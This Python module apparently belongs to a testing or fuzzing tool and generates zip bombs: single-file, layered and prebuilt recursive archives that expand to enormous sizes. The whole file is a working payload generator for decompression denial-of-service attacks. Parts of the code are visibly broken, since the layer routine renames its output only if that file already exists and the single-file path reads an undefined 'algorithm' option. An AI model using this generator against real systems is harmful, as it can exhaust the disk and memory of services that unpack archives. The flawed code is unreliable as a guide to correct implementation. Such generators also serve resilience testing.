import zipfile
import gzip
import os
import shutil
import tarfile
import logging
from options import Options


options = Options()
options.add_option('type', 'recursive', 'Type of bomb', ['single_file', 'layer', 'recursive'])
options.add_option('input_budget', 500, 'Number of bytes in input budget')
options.add_option('target_size', 100000,
                   'Desired size of decompressed file; Not applicable to AC time exploits like recursive zip bombs')
options.add_option('output_file', 'output', 'Name of compressed file; Warning: Use at your own risk! Be careful!')

DESCRIPTION = 'Produces a zip archive that expands into a very large file or set of files'


def run(generator, output):

    #TODO - do a check on output.OUTPUT_NAME, since it must be file

    if options['type'] == 'recursive':
        if options['input_budget'] > 440:
            shutil.copyfile(os.path.dirname(os.path.realpath(__file__)) + '/bombs-DONOTOPEN/zip_recursive.zip',
                            options['output_file'] + '.zip')
            print('Your zip bomb ' + options['output_file'] + '.zip is ready in your current directory.')
        else:
            logging.warning('We do not have a recursive zip bomb small enough.')

    elif options['type'] == 'layer':
        layerzipbomb(generator, int(options['input_budget']), int(options['target_size']),
                     str(options['output_file']))

    elif options['type'] == 'single_file':
        singlefilebomb(generator, str(options['algorithm']), int(options['input_budget']),
                       int(options['target_size']), str(options['output_file']))

def layerzipbomb(generator, input_budget, target_size, output_file):
    dummy_name = output_file + '.txt'
    out_zip_file = output_file + '.zip'
    generate_dummy_file(dummy_name, 1000000)
    level_1_zip = '1.zip'
    zip_compress_file(dummy_name, level_1_zip)
    os.remove(dummy_name)
    decompressed_size = 1000000
    layers = 1
    while decompressed_size < target_size:
        make_copies_and_compress('%d.zip' % layers, '%d.zip' % (layers+1), 2)
        decompressed_size *= 2
        os.remove('%d.zip' % layers)
        layers += 1
    if os.path.isfile(out_zip_file):
        os.remove(out_zip_file)
        os.rename('%d.zip' % layers, out_zip_file)
    print('Compressed File Size: %.2f B' % os.path.getsize(out_zip_file))
    print('Number of layers: %d ' % layers)
    print('Size After Decompression: %d B' % decompressed_size)

def zip_compress_file(infile, outfile):
    zf = zipfile.ZipFile(outfile, mode='w', allowZip64= True)
    zf.write(infile, compress_type=zipfile.ZIP_DEFLATED)
    zf.close()

def make_copies_and_compress(infile, outfile, n_copies):
    zf = zipfile.ZipFile(outfile, mode='w', allowZip64= True)
    filename, file_extension = os.path.splitext(infile)
    for i in range(n_copies):
        f_name = '%s-%d.%s' % (filename, i, file_extension)
        shutil.copy(infile,f_name)
        zf.write(f_name, compress_type=zipfile.ZIP_DEFLATED)
        os.remove(f_name)
    zf.close()

def generate_dummy_file(filename,size):
    with open(filename, 'w') as dummy:
        dummy.write((size*'0'))

def singlefilebomb(generator, algorithm, input_budget, target_size, output_file):
    # Writes a dummy file dummy.txt with target_size bytes of '0'.
    # Cleans up file at end of operation, probably not the cleanest way to do this.
    generate_dummy_file('dummy.txt',target_size)

    output_file_name = output_file+'.zip'
    zip_compress_file('dummy.txt', output_file_name)

    os.remove('dummy.txt')
    print('Compressed file size: %d B' % os.stat(output_file_name).st_size)
    print('Uncompressed file size: %d B' % target_size)

